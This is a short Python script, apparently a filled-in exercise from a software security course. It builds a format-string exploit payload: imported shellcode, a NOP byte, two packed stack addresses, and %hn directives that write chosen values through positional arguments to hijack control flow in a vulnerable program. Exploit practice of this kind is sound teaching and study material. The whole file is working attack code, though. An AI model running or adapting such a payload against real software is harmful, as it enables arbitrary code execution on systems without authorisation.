#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
addr1 = pack('<I', 0xfffec45c)
addr2 = pack('<I', 0xfffec45e)

sys.stdout.buffer.write(shellcode + b'\x90' + addr1 + addr2 + b'\%48175x%10$hn%17326x%11$hn')
